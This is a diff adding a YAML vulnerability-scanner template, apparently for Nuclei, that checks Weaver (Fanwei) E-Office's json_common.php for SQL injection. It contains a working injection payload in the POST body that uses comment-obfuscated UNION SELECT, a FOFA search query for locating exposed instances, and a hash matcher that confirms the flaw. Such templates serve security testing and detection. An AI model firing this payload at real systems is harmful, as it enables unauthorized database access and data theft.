@@ -1,0 +1,23 @@
+id: fanwei-eoffice-json-common-sqli
+info:
+  name: 泛微E-Office json_common.php sql注入漏洞
+  author: fgz
+  severity: critical
+  description: '作为协同管理软件行业的领军企业，泛微有业界优秀的协同管理软件产品。在企业级移动互联大潮下，泛微发布了全新的以“移动化 社交化 平台化 云端化”四化为核心的全一代产品系列，其中泛微e-office为企业办公提供丰富应用，覆盖常见协作场景，开箱即用。满足人事、行政、财务、销售、运营、市场等不同部门协作需求，帮助组织高效人事管理。系统 json_common.php 文件存在SQL注入漏洞，容易导致数据泄露以及被远控。'
+  tags: 2023,fanwei,sqli,eoffice
+  metadata:
+    max-request: 3
+    fofa-query: app="泛微-EOffice"
+    verified: true
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/building/json_common.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5(102103122) ,4#|2|333"
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains(body,'6cfe798ba8e5b85feb50164c59f4bec9')"
